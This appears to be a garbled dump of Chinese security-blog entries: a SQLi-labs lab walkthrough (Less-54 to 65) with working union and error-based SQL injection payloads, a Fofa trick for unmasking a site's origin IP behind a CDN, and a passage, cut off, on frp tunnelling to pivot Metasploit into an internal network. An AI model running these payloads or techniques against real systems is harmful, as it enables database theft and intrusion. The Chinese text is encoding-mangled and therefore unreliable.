class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT 1 FROM <span class="token interpolation"><span class="token variable">$table</span></span> WHERE <span class="token interpolation"><span class="token variable">$col1</span></span>= '<span class="token interpolation"><span class="token variable">$key</span></span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç ä¸­å¯ä»¥åˆ†äº«å‡ºï¼Œå¾—è®©æˆ‘ä»¬åœ¨ 10 æ¬¡æ³¨å…¥æµ‹è¯•ä¸­æ‹¿åˆ° key å€¼ã€‚çœ‹äº†æºç å¯ä»¥ç›´æ¥è”åˆæŸ¥è¯¢ï¼Œ10 æ¬¡ä»¥å†…æ‹¿åˆ° key æ„Ÿè§‰é—®é¢˜ä¸å¤§ï¼Œé‚£ä¹ˆå°è¯•çœ‹çœ‹å§ï¼š</p><p><strong>åˆ¤æ–­é—­åˆæ–¹å¼</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>åˆ¤æ–­å­—æ®µæ•°</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39; order by 3--+?id&#x3D;1&#39; order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>æŸ¥è¯¢æœ‰å¯æ³¨å…¥çš„å­—æ®µ</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å­—æ®µæ•° 2,3</p><p>æŸ¥è¯¢è¡¨å**</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¡¨åä¸ºï¼šKMA0E2Z29V ï¼Œè¿™ä¸ªè¡¨åå¯èƒ½æ˜¯éšæœºçš„ ä¸åŒç”¨æˆ·ä¸ä¸€æ ·</p><p><strong>æŸ¥è¯¢åˆ—å</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;0x4b4d413045325a323956)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥åˆ°åˆ—åå¦‚ä¸‹ï¼šidã€sessidã€secret_1XVBã€tryy</p><p><strong>æŸ¥è¯¢å­—æ®µå€¼</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_1XVB)+FROM+KMA0E2Z29V)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ° key å€¼ä¸ºï¼šUNK985xGrJL5PIWKGogHXo3F</p><p>æ€»å…±åªéœ€è¦ 6 æ­¥ï¼Œå…¶ä¸­åœ¨åˆ¤æ–­å­—æ®µæ•°è¿™é‡Œæœ‰ä¸ç¡®å®šæ€§ï¼Œç†è®ºä¸Š 10 æ­¥ä»¥å†…æ˜¯å¯ä»¥æ­£å¸¸æ³¨å…¥å‡ºæ¥çš„ã€‚</p><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=($id)</code></td></tr></tbody></table><p>Less-55 ç»™äº† 14 æ¬¡å°è¯•æœºä¼šï¼Œä»£ç åŸºæœ¬ä¸Šæ²¡æœ‰å˜åŒ–ï¼Œåªæ˜¯é—­åˆæ–¹å¼å‘ç”Ÿäº†å˜åŒ–ï¼Œ è¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>å’Œ Less-54 ç›¸æ¯”åªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ï¼Œè¿˜æ˜¯é‚£ä¸ªå§¿åŠ¿ï¼Œè¯¦è§ Less-54</p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>å’Œ Less-54 ç›¸æ¯”åªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ï¼Œè¿˜æ˜¯é‚£ä¸ªå§¿åŠ¿ï¼Œè¯¦è§ Less-54</p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>Less-58 è¿™é‡Œç›¸æ¯”è¾ƒäº Less-54 - Less-57 å˜åŒ–è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œä¸»è¦æœ‰æ˜æ˜¾åŒºåˆ«çš„ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$unames</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Dumb"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Angelina"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Dummy"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"secure"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"stupid"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"superman"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"batman"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dhakkan"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$unames</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Login name : '</span><span class="token operator">.</span> <span class="token variable">$unames</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Password : '</span> <span class="token operator">.</span><span class="token variable">$pass</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºè¿™é‡Œè¾“å‡ºåªè¾“å‡º <code>$unames</code> å’Œ <code>$pass</code> æ•°ç»„ï¼Œpass æ•°ç»„å°±æ˜¯ unames æ•°ç»„çš„é€†åºï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨è”åˆæŸ¥è¯¢çš„è¯æ˜¯æ²¡æœ‰æ•ˆæœçš„ï¼Œè¾“å‡ºä¸äº†æœ‰ç”¨çš„ä¿¡æ¯ã€‚å¤©æ— ç»äººä¹‹è·¯ï¼Œä½†æ˜¯ä¸‹é¢è¾“å‡ºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥è¿™é‡Œå°±å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œä¸‹é¢ç›´æ¥ä¸¢ payload å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(secret_OD68 )+AS+CHAR),0x7e))+FROM+WOO6ID239T+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œ æ³¨å…¥çš„è¡¨åä¸ºï¼šWOO6ID239Tï¼Œåˆ—åä¸ºï¼šsecret_OD68</p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>ä¸ Less-58 çš„æ€è·¯ä¸€æ ·ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ï¼Œè¯¦è§ Less-58</p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=ï¼ˆ&quot;$id&quot;ï¼‰</code></td></tr></tbody></table><p>ä¸ Less-58 æ³¨å…¥æ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ç½¢äº†ï¼Œè¯¦è§ Less-58</p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p>ä¸ Less-58 æ³¨å…¥æ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ç½¢äº†ï¼Œè¯¦è§ Less-58</p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>æ­¤æ—¶æŠ¥é”™ä¹Ÿå–æ¶ˆäº†ï¼Œè¿™é‡Œåªèƒ½è¿›è¡Œå¸ƒå°”ç›²æ³¨æˆ–è€…å»¶æ—¶ç›²æ³¨äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªå¤§å·¥ç¨‹ï¼Œåœ¨å®æˆ˜å·¥ç¨‹ä¸­è¿˜æ˜¯é  sqlmap è¿™ç§è‡ªåŠ¨åŒ–æ³¨å…¥ç¥å™¨äº†ï¼Œæ‰‹å·¥æ³¨å…¥çš„è¯å²‚ä¸æ˜¯å¾—å¤©è’åœ°è€ã€‚</p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>ä¸ Less-62 æ³¨å…¥æ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ç½¢äº†ï¼Œè¯¦è§ Less-62</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(($id))</code></td></tr></tbody></table><p>ä¸ Less-62 æ³¨å…¥æ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ç½¢äº†ï¼Œè¯¦è§ Less-62</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p>ä¸ Less-62 æ³¨å…¥æ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ç½¢äº†ï¼Œè¯¦è§ Less-62</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å®é™…ä¸Š sqlmap ä¹Ÿå¾ˆå¼ºå¤§ï¼Œå°¤å…¶æ˜¯åœ¨ç›²æ³¨è¿™ä¸€å—æ•ˆç‡æ¯”æ‰‹å·¥è¦å¿«å¾ˆå¤šï¼Œä½†æ˜¯æ­£å¦‚ æŸäº›å¤§ä½¬è¯´çš„ä¸€æ ·ï¼Œä¸€ä¸Šæ¥å°±ä½¿ç”¨å·¥å…·è¿™æ ·åªä¼šå˜æˆæœ€åƒåœ¾çš„è„šæœ¬å°å­ï¼ˆscript kidsï¼‰ï¼Œæ‰€ä»¥æ‰‹å·¥æ³¨å…¥è¿˜æ˜¯ç³»ç»Ÿçš„å­¦ä¹ æŒæ¡ä¸€ä¸‹çš„ï¼Œæ‰‹å·¥æ³¨å…¥åœ¨å­˜åœ¨è”åˆå’ŒæŠ¥é”™æ³¨å…¥çš„æƒ…å†µä¸‹ï¼Œæ³¨å…¥é€Ÿåº¦ä¹Ÿæ˜¯ä¸ä½äº sqlmap çš„å“¦ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ul><li><a href="https://www.cnblogs.com/lcamry/">lcamry å¤§ä½¬çš„ã€ŠMySQLæ³¨å…¥å¤©ä¹¦ã€‹</a></li><li><a href="https://www.anquanke.com/post/id/98096">Dnslog åœ¨ SQL æ³¨å…¥ä¸­çš„å®æˆ˜</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> SQLI-labs é¶åœºå­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¶åœºå­¦ä¹ è®°å½•</title>
      <link href="/2022/01/20/ba-chang-xue-xi-ji-lu/"/>
      <url>/2022/01/20/ba-chang-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Fofaç¡®å®šç½‘ç«™çœŸå®IPåœ°å€çš„å°æŠ€å·§</title>
      <link href="/2022/01/19/shi-yong-fofa-que-ding-wang-zhan-zhen-shi-ip-di-zhi-de-xiao-ji-qiao/"/>
      <url>/2022/01/19/shi-yong-fofa-que-ding-wang-zhan-zhen-shi-ip-di-zhi-de-xiao-ji-qiao/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>æˆ‘ä»¬æƒ³ç¡®å®šä¸€ä¸ªç½‘ç«™çš„çœŸå®IPåœ°å€ï¼Œé€šå¸¸ç°åœ¨ç½‘ç«™éƒ½ä¼šä½¿ç”¨httpsåè®®ï¼Œç”¨åˆ°SSLè¯ä¹¦æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œç»å¤§å¤šæ•°ä¼ä¸šè¯ä¹¦éƒ½æ˜¯é€šé…ç¬¦è¯ä¹¦ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠè¯ä¹¦çš„åºåˆ—å·æ‹¿ä¸‹æ¥ç„¶åæœç´¢è¿™ä¸ªè¯ä¹¦ç”¨åœ¨äº†å“ªäº›ä¸šåŠ¡é‡Œï¼Œç„¶åå¦‚æœéƒ¨åˆ†ä¸šåŠ¡ä¸­æ²¡æœ‰ä½¿ç”¨CDNæˆ–è€…æ²¡æœ‰è¦†ç›–åˆ°CDNï¼ŒæºIPåœ°å€å°±æ˜¾ç¤ºå‡ºæ¥äº†ï¼</p><h2 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h2><p><a href="https://fofa.so/">https://fofa.so/</a></p><h2 id="æ•™ç¨‹"><a href="#æ•™ç¨‹" class="headerlink" title="æ•™ç¨‹"></a>æ•™ç¨‹</h2><p>ä»¥<a href="https://www.zhihu.com/signin?next=/">çŸ¥ä¹</a>ç½‘ç«™ä¸ºä¾‹ï¼Œæˆ‘ä»¬å…ˆè®¿é—®ç½‘ç«™ï¼Œç„¶åæŒ‰F12æ‰“å¼€<code>å¼€å‘è€…å·¥å…·</code>ï¼Œç‚¹å‡»<code>Security</code></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191810197.png" alt="image-20220119181014309"></p><p>ç‚¹å‡»<code>View certificate</code>ï¼ŒæŸ¥çœ‹è¯ä¹¦è¯¦æƒ…</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191811564.png" alt="image-20220119181100340"></p><p>è¿™é‡Œæœ‰<code>è¯¦ç»†ä¿¡æ¯</code>ï¼Œå…¶ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>åºåˆ—å·</code></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191812758.png" alt="image-20220119181239327"></p><pre class="line-numbers language-none"><code class="language-none">08FD71FF37DEFF955767502270961AE6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨<a href="https://tool.lu/hexconvert/">åœ¨çº¿è½¬æ¢å·¥å…·</a>ï¼Œå°†16è¿›åˆ¶çš„åºåˆ—å·è½¬æ¢ä¸º10è¿›åˆ¶</p><pre class="line-numbers language-none"><code class="language-none">14516903431790578896883864801849922917<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191820420.png" alt="image-20220119182038459"></p><p>è¿™æ—¶å€™Fofaçš„ä½œç”¨å°±æ¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„è¯­å¥æ¥è¿›è¡Œè°ƒæŸ¥</p><pre class="line-numbers language-none"><code class="language-none">cert&#x3D;&quot;11949787204246556179857180358287432422&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191821509.png" alt="image-20220119182112934"></p>]]></content>
      
      
      
        <tags>
            
            <tag> FOFA çœŸå®IPå®šä½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frpå†…ç½‘ç©¿é€æŠŠMSFæ‹–å…¥å†…ç½‘</title>
      <link href="/2022/01/19/frp-nei-wang-chuan-tou-ba-msf-tuo-ru-nei-wang/"/>
      <url>/2022/01/19/frp-nei-wang-chuan-tou-ba-msf-tuo-ru-nei-wang/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>frp ä¸­æ–‡æ–‡æ¡£ï¼š<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p><p>frp æ˜¯ä¸€ä¸ªä¸“æ³¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†åº”ç”¨ï¼Œæ”¯æŒ TCPã€UDPã€HTTPã€HTTPS ç­‰å¤šç§åè®®ã€‚å¯ä»¥å°†å†…ç½‘æœåŠ¡ä»¥å®‰å…¨ã€ä¾¿æ·çš„æ–¹å¼é€šè¿‡å…·æœ‰å…¬ç½‘ IP èŠ‚ç‚¹çš„ä¸­è½¬æš´éœ²åˆ°å…¬ç½‘ï¼›</p><p>frpä¸‹è½½åœ°å€ï¼š<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><h2 id="FPRç®€ä»‹"><a href="#FPRç®€ä»‹" class="headerlink" title="FPRç®€ä»‹"></a>FPRç®€ä»‹</h2><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191706956.jpeg" alt="img"></p><p>é€šè¿‡åœ¨å…·æœ‰å…¬ç½‘ IP çš„èŠ‚ç‚¹ä¸Šéƒ¨ç½² frp æœåŠ¡ç«¯ï¼Œå¯ä»¥è½»æ¾åœ°å°†å†…ç½‘æœåŠ¡ç©¿é€åˆ°å…¬ç½‘ï¼ŒåŒæ—¶æä¾›è¯¸å¤šä¸“ä¸šçš„åŠŸèƒ½ç‰¹æ€§ï¼Œè¿™åŒ…æ‹¬ï¼š</p><ul><li><p>å®¢æˆ·ç«¯æœåŠ¡ç«¯é€šä¿¡æ”¯æŒ TCPã€KCP ä»¥åŠ Websocket ç­‰å¤šç§åè®®ã€‚</p></li><li><p>é‡‡ç”¨ TCP è¿æ¥æµå¼å¤ç”¨ï¼Œåœ¨å•ä¸ªè¿æ¥é—´æ‰¿è½½æ›´å¤šè¯·æ±‚ï¼ŒèŠ‚çœè¿æ¥å»ºç«‹æ—¶é—´ã€‚</p></li><li><p>ä»£ç†ç»„é—´çš„è´Ÿè½½å‡è¡¡ã€‚</p></li><li><p>ç«¯å£å¤ç”¨ï¼Œå¤šä¸ªæœåŠ¡é€šè¿‡åŒä¸€ä¸ªæœåŠ¡ç«¯ç«¯å£æš´éœ²ã€‚</p></li><li><p>å¤šä¸ªåŸç”Ÿæ”¯æŒçš„å®¢æˆ·ç«¯æ’ä»¶ï¼ˆé™æ€æ–‡ä»¶æŸ¥çœ‹ï¼ŒHTTPã€SOCK5 ä»£ç†ç­‰ï¼‰ï¼Œä¾¿äºç‹¬ç«‹ä½¿ç”¨ frp å®¢æˆ·ç«¯å®ŒæˆæŸäº›å·¥ä½œã€‚</p></li><li><p>é«˜åº¦æ‰©å±•æ€§çš„æœåŠ¡ç«¯æ’ä»¶ç³»ç»Ÿï¼Œæ–¹ä¾¿ç»“åˆè‡ªèº«éœ€æ±‚è¿›è¡ŒåŠŸèƒ½æ‰©å±•ã€‚</p></li><li><p>æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ UI é¡µé¢ã€‚</p></li></ul><h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><p>ç¼–å†™é…ç½®æ–‡ä»¶ï¼Œå…ˆé€šè¿‡ ./frps -c ./frps.ini å¯åŠ¨æœåŠ¡ç«¯ï¼Œå†é€šè¿‡ ./frpc -c ./frpc.ini å¯åŠ¨å®¢æˆ·ç«¯ã€‚å¦‚æœéœ€è¦åœ¨åå°é•¿æœŸè¿è¡Œï¼Œå»ºè®®ç»“åˆå…¶ä»–å·¥å…·ä½¿ç”¨ï¼Œä¾‹å¦‚ systemd å’Œ supervisorï¼›</p><p>1ã€æœåŠ¡ç«¯frps.ini å†…å®¹å¦‚ä¸‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port <span class="token operator">=</span> <span class="token number">10014</span>token <span class="token operator">=</span> <span class="token number">12345678</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191706841.png" alt="img"></p><p>2ã€åœ¨éœ€è¦æš´éœ²åˆ°å†…ç½‘çš„æœºå™¨ä¸Šéƒ¨ç½² frpcï¼Œfrpc.inié…ç½®å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>server_addr <span class="token operator">=</span> <span class="token number">45.32</span><span class="token number">.38</span><span class="token number">.119</span>server_port <span class="token operator">=</span> <span class="token number">10014</span>token <span class="token operator">=</span> <span class="token number">12345678</span><span class="token punctuation">[</span>ssh<span class="token punctuation">]</span><span class="token builtin">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>           local_port <span class="token operator">=</span> <span class="token number">1234</span>remote_port <span class="token operator">=</span> <span class="token number">10015</span> å…¶ä¸­commonå­—æ®µä¸‹çš„ä¸‰é¡¹å³ä¸ºæœåŠ¡ç«¯çš„è®¾ç½®ã€‚â€œserver_addrâ€ä¸ºæœåŠ¡ç«¯IPåœ°å€ï¼Œå¡«å…¥å³å¯ã€‚â€œserver_portâ€ä¸ºæœåŠ¡å™¨ç«¯å£ï¼Œå¡«å…¥ä½ è®¾ç½®çš„ç«¯å£å·å³å¯ï¼Œå¦‚æœæœªæ”¹å˜å°±æ˜¯<span class="token number">7000</span>â€œtokenâ€æ˜¯ä½ åœ¨æœåŠ¡å™¨ä¸Šè®¾ç½®çš„è¿æ¥å£ä»¤ï¼ŒåŸæ ·å¡«å…¥å³å¯ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707427.png" alt="img"></p><p>æ³¨æ„ï¼šå®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯æç¤ºè®¿é—®è¢«æ‹’ç»ï¼Œåˆ™éœ€è¦æœåŠ¡ç«¯å¼€æ”¾é˜²ç«å¢™ç«¯å£ï¼ˆå­¦ä¹ çš„è¯å…¨å¼€å°±è¡Œäº†ï¼Œç”Ÿäº§ç¯å¢ƒé™¤å¤–ï¼‰</p><h2 id="è”åŠ¨MSF"><a href="#è”åŠ¨MSF" class="headerlink" title="è”åŠ¨MSF"></a>è”åŠ¨MSF</h2><p>å¯åŠ¨FRPæœåŠ¡ç«¯ï¼š</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707174.png" alt="img"></p><p>å¯åŠ¨FRPå®¢æˆ·ç«¯ï¼š</p><p><img 